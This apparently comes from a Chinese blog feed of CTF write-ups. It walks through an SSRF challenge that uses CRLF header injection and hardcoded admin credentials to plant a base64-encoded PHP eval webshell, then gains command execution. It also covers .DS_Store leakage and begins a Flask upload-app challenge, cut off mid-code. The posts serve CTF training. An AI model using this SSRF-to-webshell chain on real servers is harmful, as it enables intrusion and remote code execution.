class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br></code></pre></td></tr></table></figure><p>ç„¶åå»çœ‹<code>calculator.php</code>çš„æºç ï¼Œæœ‰ä¸€ä¸ª<code>check</code>å‡½æ•°æ£€æŸ¥ HTTP è®¤è¯ä¿¡æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªç”¨äºæ£€æŸ¥ HTTP è®¤è¯ä¿¡æ¯çš„å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$auth</span></span>) </span>&#123;<br>    <span class="hljs-comment">// å£°æ˜ä½¿ç”¨å…¨å±€å˜é‡ $admin å’Œ $adminpass</span><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$admin</span>,<span class="hljs-variable">$adminpass</span>;<br>    <span class="hljs-comment">// å»é™¤è®¤è¯ä¿¡æ¯ä¸­çš„ &quot;Basic &quot; å‰ç¼€</span><br>    <span class="hljs-variable">$auth</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;Basic &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// å¯¹å»é™¤å‰ç¼€åçš„è®¤è¯ä¿¡æ¯è¿›è¡Œ Base64 è§£ç </span><br>    <span class="hljs-variable">$auth</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// ä½¿ç”¨å†’å·åˆ†å‰²è§£ç åçš„è®¤è¯ä¿¡æ¯ï¼Œå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç </span><br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// è¾“å‡ºç”¨æˆ·åå’Œå¯†ç ï¼Œæ–¹ä¾¿è°ƒè¯•</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$password</span>;<br>    <span class="hljs-comment">// æ£€æŸ¥ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦ä¸ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç åŒ¹é…</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>===<span class="hljs-variable">$admin</span> &amp;&amp; <span class="hljs-variable">$password</span>===<span class="hljs-variable">$adminpass</span>) &#123;<br>        <span class="hljs-comment">// å¦‚æœåŒ¹é…ï¼Œè¿”å› 1</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// å¦‚æœä¸åŒ¹é…ï¼Œè¿”å› 2</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// è·å– POST è¯·æ±‚ä¸­åä¸º &quot;expression&quot; çš„å‚æ•°å€¼ï¼Œå³è¦è®¡ç®—çš„æ•°å­¦è¡¨è¾¾å¼</span><br><span class="hljs-variable">$expression</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;expression&#x27;</span>];<br><span class="hljs-comment">// è·å– HTTP è¯·æ±‚å¤´ä¸­çš„ &quot;Authorization&quot; å­—æ®µçš„å€¼ï¼Œå³è®¤è¯ä¿¡æ¯</span><br><span class="hljs-variable">$auth</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_AUTHORIZATION&#x27;</span>];<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¦éªŒè¯ç™»å½•çš„ç”¨æˆ·å’Œå¯†ç ï¼Œç»™çš„è¯·æ±‚å¤´æ˜¯<code>Authorization</code>ï¼Œåœ¨<code>check</code>å‡½æ•°ä¸­ä¼šå»é™¤</p><p><code>Basic </code>å‰ç¼€ï¼Œè¿˜ä¼šå¯¹å…¶è¿›è¡Œ base64 è§£ç ï¼Œå¹¶ä¸”ä½¿ç”¨å†’å·<code>:</code>æ¥åˆ†éš”å¼€ç”¨æˆ·åå’Œå¯†ç ï¼Œå¯¹äºadminçš„ç”¨æˆ·åå’Œå¯†ç æ—©åœ¨å¼€å¤´å°±å·²ç»å®šä¹‰å¥½äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// å®šä¹‰ç®¡ç†å‘˜ç”¨æˆ·å</span><br><span class="hljs-variable">$admin</span>=<span class="hljs-string">&quot;aaaaaaaaaaaadmin&quot;</span>;<br><span class="hljs-comment">// å®šä¹‰ç®¡ç†å‘˜å¯†ç </span><br><span class="hljs-variable">$adminpass</span>=<span class="hljs-string">&quot;i_want_to_getI00_inMyT3st&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç»è¿‡åˆ†æåæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æ„é€ <code>Authorization</code>è¿™ä¸ªè¯·æ±‚å¤´äº†ï¼Œé¦–å…ˆæ˜¯æ­£å¸¸çš„ä½¿ç”¨adminçš„ç”¨æˆ·åå’Œå¯†ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å­˜åœ¨è®¤è¯ä¿¡æ¯</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$auth</span>))&#123;<br>    <span class="hljs-comment">// è°ƒç”¨ check å‡½æ•°æ£€æŸ¥è®¤è¯ä¿¡æ¯</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$auth</span>)===<span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-comment">// å¦‚æœè®¤è¯å¤±è´¥ï¼ˆè¿”å›å€¼ä¸º 2ï¼‰</span><br>        <span class="hljs-comment">// æ£€æŸ¥è¡¨è¾¾å¼æ˜¯å¦åªåŒ…å«æ•°å­—å’Œå››åˆ™è¿ç®—ç¬¦</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[0-9+\-*\/]+$/&#x27;</span>, <span class="hljs-variable">$expression</span>)) &#123;<br>            <span class="hljs-comment">// å¦‚æœè¡¨è¾¾å¼ä¸ç¬¦åˆè¦æ±‚ï¼Œè¾“å‡º &quot;Invalid expression&quot; å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid expression&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">// å¦‚æœè¡¨è¾¾å¼ç¬¦åˆè¦æ±‚ï¼Œä½¿ç”¨ eval å‡½æ•°è®¡ç®—è¡¨è¾¾å¼çš„å€¼</span><br>            <span class="hljs-variable">$result</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$expression</span>;&quot;</span>);<br>            <span class="hljs-comment">// å°†è®¡ç®—ç»“æœå†™å…¥ &quot;result&quot; æ–‡ä»¶</span><br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;result&quot;</span>,<span class="hljs-variable">$result</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// å¦‚æœè®¤è¯æˆåŠŸï¼ˆè¿”å›å€¼ä¸ä¸º 2ï¼‰</span><br>        <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨ eval å‡½æ•°è®¡ç®—è¡¨è¾¾å¼çš„å€¼</span><br>        <span class="hljs-variable">$result</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$expression</span>;&quot;</span>);<br>        <span class="hljs-comment">// å°†è®¡ç®—ç»“æœå†™å…¥ &quot;result&quot; æ–‡ä»¶</span><br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;result&quot;</span>,<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// å¦‚æœä¸å­˜åœ¨è®¤è¯ä¿¡æ¯ï¼Œè¾“å‡º &quot;Hacker&quot; å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸€å®šè¦ç”¨adminçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå› ä¸ºåœ¨åé¢çš„æ£€æŸ¥è®¤è¯ä¿¡æ¯ä¸­æ˜¯ä¼šæ£€æŸ¥<code>check($auth)</code>çš„è¿”å›å€¼çš„ï¼Œä¸æ˜¯adminçš„ä¼šè¿”å›2ï¼Œæœ€ç»ˆä¼šæœ‰æ£€æŸ¥æ„é€ çš„<code>expression</code>è¡¨è¾¾å¼çš„ï¼Œåªæœ‰ç¬¦åˆè¦æ±‚æ‰èƒ½è¢«<code>eval</code>æ‰§è¡Œï¼Œè€Œå¦‚æœæ˜¯adminçš„ä¼šè¿”å›1ï¼Œæœ€ç»ˆæ˜¯ç›´æ¥æ‰§è¡Œæ„é€ çš„<code>expression</code>è¡¨è¾¾å¼çš„ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¯¹è¿™ä¸ªè¡¨è¾¾å¼è¿›è¡Œæ„é€ æ¶æ„çš„ä»£ç ä»è€Œè¿›è¡ŒRCEæˆ–ä¼ shelläº†</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>aaaaaaaaaaaadmin:i_want_to_getI00_inMyT3st<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯è¦è¿›è¡Œ base64 ç¼–ç </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯è¦åŠ ä¸Š<code>Basic </code>å‰ç¼€ï¼Œè¿™é‡Œè¦æ³¨æ„åœ¨<code>Basic</code>åé¢è·Ÿè¿˜æœ‰ä¸€ä¸ªç©ºæ ¼åˆ«å¿˜äº†</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ˜¯æœ€ç»ˆè¦æ„é€ çš„<code>Authorization</code>è¿™ä¸ªè¯·æ±‚å¤´äº†</p><p>ç„¶åæ˜¯è¦POSTä¼ å‚çš„<code>expression</code>ï¼Œè¿™ä¸ªæ˜¯è¦åœ¨åé¢ä¸­çš„è¢«<code>eval</code>æ‰§è¡Œçš„ï¼Œå¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„ä»£ç è¿›è¡Œä¼ shellï¼Œè¿™ä¸ªæ¶æ„ä»£ç å¯ä»¥è¢«æ‰§è¡Œçš„å‰ææ˜¯æ»¡è¶³å‰é¢çš„èº«ä»½è®¤è¯ï¼Œè¿™é‡Œä½¿ç”¨<code>file_put_contents</code>å‡½æ•°ï¼Œå†™ä¸€ä¸ªåé—¨æ–‡ä»¶è¿›å»ï¼Œæœ€å¥½åŠ ä¸Šbase64ç¼–ç å¯ä»¥ç»•è¿‡äº›é™åˆ¶ï¼Œè¿™é‡Œå°±æ˜¯å°†ä¸€å¥è¯æœ¨é©¬<code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>å†™å…¥<code>shell3.php</code>æ–‡ä»¶ä¸­</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">expression=file_put_contents(&#x27;shell3.php&#x27;, base64_decode(&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&#x27;))<br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯æ­£å¸¸çš„POSTè¯·æ±‚æ‰“SSRFéœ€è¦çš„è¯·æ±‚å¤´<code>Content-Length</code>ï¼Œå³è¯·æ±‚çš„å†…å®¹é•¿åº¦ï¼Œæ˜¯æ ¹æ®ä¸Šé¢æ„é€ çš„<code>expression</code>æ¥è¿›è¡Œæ„é€ çš„</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>101<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªåœ°æ–¹ï¼Œä½ ä¼šä¸ä¼šç–‘é—®ä¸ºä»€ä¹ˆè¿™ä¸ªçš„é•¿åº¦ä¸åŒ…å«<code>user</code>å‘¢ï¼Œå®ƒä¹Ÿæ˜¯POSTä¼ å‚çš„å‘€ï¼Œä¸ºä»€ä¹ˆä¸åŠ ä¸Šå®ƒçš„é•¿åº¦</p><p>åŸå› å°±æ˜¯è¿™é‡Œçš„<code>Content-Length</code>è®°å½•çš„æ˜¯è¯·æ±‚ç½‘å€çš„POSTè¦ä¼ çš„å‚ï¼Œå³<code>calculator.php</code>å¯¹è¦ä¼ çš„å‚ï¼Œè€Œ<code>user</code>æ˜¯<code>h4d333333.php</code>ä¸­çš„å‚æ•°ï¼Œæ‰€ä»¥ä¸è¦åŒ…å«<code>user</code>çš„å†…å®¹é•¿åº¦</p><p>è‡³æ­¤ï¼Œç»¼åˆä»¥ä¸Šæ„é€ çš„æ‰€æœ‰çš„POSTæ‰“SSRFçš„å†…å®¹çš„<code>payload</code>å¦‚ä¸‹ï¼Œè¦ç”¨<code>%0d%0a</code>åˆ†éš”å¼€å„ä¸ªè¯·æ±‚å¤´</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">user=abc%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aAuthorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0d%0aContent-Length: 101%0d%0a%0d%0aexpression=file_put_contents(&#x27;shell3.php&#x27;, base64_decode(&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&#x27;))<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨<code>h4d333333.php</code>ä¸­å‘é€æ„é€ çš„GETå’ŒPOSTè¯·æ±‚ï¼Œæ‰“SSRF</p><p><img src="/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250331000442974.png" alt="image-20250331000442974"></p><p>ç„¶åè®¿é—®<code>shell3.php</code>æ–‡ä»¶ï¼Œåˆ©ç”¨POSTå‚æ•°<code>cmd</code>è¿›è¡ŒRCE</p><p><img src="/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250331000544062.png" alt="image-20250331000544062"></p><p><img src="/2025/04/29/2024%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250331000601611.png" alt="image-20250331000601611"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SYC</span>&#123;<span class="hljs-number">76284</span>c66-<span class="hljs-number">4103</span>-<span class="hljs-number">4</span>e62-a095-<span class="hljs-number">461431</span>bdb852&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åˆ·é¢˜ç»ƒä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DS_Storeæ³„éœ²</title>
    <link href="/2025/04/29/DS-Store%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/04/29/DS-Store%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯-DS-Store"><a href="#ä»€ä¹ˆæ˜¯-DS-Store" class="headerlink" title="ä»€ä¹ˆæ˜¯.DS_Store"></a>ä»€ä¹ˆæ˜¯.DS_Store</h1><p>.DS_Store æ˜¯ â€œDesktop Services Storeâ€ çš„ç¼©å†™ï¼Œæ˜¯ Mac OS ç³»ç»Ÿè‡ªåŠ¨ä¸ºæ¯ä¸ªæ–‡ä»¶å¤¹åˆ›å»ºçš„éšè—æ–‡ä»¶2ã€‚å®ƒä¸»è¦ç”¨äºå­˜å‚¨æ–‡ä»¶å¤¹çš„æ˜¾ç¤ºå±æ€§ï¼Œå¦‚æ–‡ä»¶å›¾æ ‡çš„æ‘†æ”¾ä½ç½®ã€è§†å›¾è®¾ç½®ã€èƒŒæ™¯é¢œè‰²ç­‰ï¼Œä»¥ä¾¿è®©ç”¨æˆ·åœ¨ä¸‹æ¬¡æ‰“å¼€æ–‡ä»¶å¤¹æ—¶èƒ½ä¿æŒä¹‹å‰çš„ä¸ªæ€§åŒ–è®¾ç½®</p><h1 id="DS-Storeæ–‡ä»¶æ³„éœ²"><a href="#DS-Storeæ–‡ä»¶æ³„éœ²" class="headerlink" title=".DS_Storeæ–‡ä»¶æ³„éœ²"></a>.DS_Storeæ–‡ä»¶æ³„éœ²</h1><p>ç”±äºå¼€å‘&#x2F;è®¾è®¡äººå‘˜åœ¨å‘å¸ƒä»£ç æ—¶æœªåˆ é™¤æ–‡ä»¶å¤¹ä¸­éšè—çš„.DS_storeï¼Œ.DS_Store æ–‡ä»¶åŒ…å«äº†æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•çš„åˆ—è¡¨ä¿¡æ¯ï¼Œå¯èƒ½é€ æˆæ–‡ä»¶ç›®å½•ç»“æ„æ³„æ¼ã€æºä»£ç æ–‡ä»¶ç­‰æ•æ„Ÿä¿¡æ¯çš„æ³„éœ²</p><h1 id="åˆ©ç”¨å·¥å…·"><a href="#åˆ©ç”¨å·¥å…·" class="headerlink" title="åˆ©ç”¨å·¥å…·"></a>åˆ©ç”¨å·¥å…·</h1><p>å·¥å…·ç½‘å€ï¼š<a href="https://github.com/gehaxelt/Python-dsstore">https://github.com/gehaxelt/Python-dsstore</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python main.py .DS_Store<br></code></pre></td></tr></table></figure><h1 id="CTFä¾‹é¢˜"><a href="#CTFä¾‹é¢˜" class="headerlink" title="CTFä¾‹é¢˜"></a>CTFä¾‹é¢˜</h1><p>é¢˜ç›®æ¥æºï¼šNSSCTFâ€”.DS_Storeæ³„éœ²</p><p>ç”¨dirsearchæ‰«å‡ºæœ‰<code>.DS_Store</code>æ–‡ä»¶<img src="/2025/04/29/DS-Store%E6%B3%84%E9%9C%B2/image-20250429192558291.png" alt="image-20250429192558291"></p><p>è®¿é—®æ–‡ä»¶å¯ä»¥ä¸‹è½½ä¸‹æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://node5.anna.nssctf.cn:20640/.DS_store<br></code></pre></td></tr></table></figure><p>ç„¶åæŠŠä¸‹è½½çš„æ–‡ä»¶å¤åˆ¶åˆ°è„šæœ¬çš„ç›®å½•ä¸‹</p><p><img src="/2025/04/29/DS-Store%E6%B3%84%E9%9C%B2/image-20250429192759151.png" alt="image-20250429192759151"></p><p>åˆ©ç”¨å·¥å…·è·å–ç½‘ç«™çš„æ–‡ä»¶ç›®å½•</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span> .DS_Store<br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/DS-Store%E6%B3%84%E9%9C%B2/image-20250429192939298.png" alt="image-20250429192939298"></p><p><img src="/2025/04/29/DS-Store%E6%B3%84%E9%9C%B2/image-20250429192958196.png" alt="image-20250429192958196"></p>]]></content>
    
    
    <categories>
      
      <category>ä¿¡æ¯æœé›†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¿¡æ¯æœé›† DS_Storeæ³„éœ²</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewYear CTF 2025--Web-ğŸå¹´å¤§å‰</title>
    <link href="/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/"/>
    <url>/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/</url>
    
    <content type="html"><![CDATA[<p>é¢˜ç›®ç½‘å€ï¼š<a href="https://ctf.xidian.edu.cn/training/16?challenge=704">https://ctf.xidian.edu.cn/training/16?challenge=704</a></p><p>ç»™äº†é¢˜ç›®é™„ä»¶</p><p><img src="/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/image-20250429201406803.png" alt="image-20250429201406803"></p><p><img src="/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/image-20250429201412575.png" alt="image-20250429201412575"></p><p>app.pyæºç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, jsonify, send_from_directory<br><br>app = Flask(__name__)<br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span><br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER<br><span class="hljs-meta">@app.before_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">before_request</span>():<br>    <span class="hljs-keyword">try</span>:<br>        os.remove(<span class="hljs-string">&#x27;archive.tar&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error occurred while removing tar file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No file part&#x27;</span><br><br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>    <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No selected file&#x27;</span><br><br>    file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;File <span class="hljs-subst">&#123;file.filename&#125;</span> uploaded successfully!&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/list&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_files</span>():<br>    <span class="hljs-keyword">try</span>:<br>        result = subprocess.run(<br>            [<span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">f&#x27;cd <span class="hljs-subst">&#123;app.config[<span class="hljs-string">&quot;UPLOAD_FOLDER&quot;</span>]&#125;</span> &amp;&amp; find *&#x27;</span>],<br>            stdout = subprocess.PIPE,<br>            text = <span class="hljs-literal">True</span><br>        )<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;files&#x27;</span>: result.stdout.splitlines()&#125;)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error occurred while listing files: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/delete&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_files</span>():<br>    <span class="hljs-keyword">try</span>:<br>        subprocess.run(<br>            [<span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">f&#x27;cd <span class="hljs-subst">&#123;app.config[<span class="hljs-string">&quot;UPLOAD_FOLDER&quot;</span>]&#125;</span> &amp;&amp; rm ./*&#x27;</span>]<br>        )<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;All files deleted successfully!&#x27;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error occurred while deleting files: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span 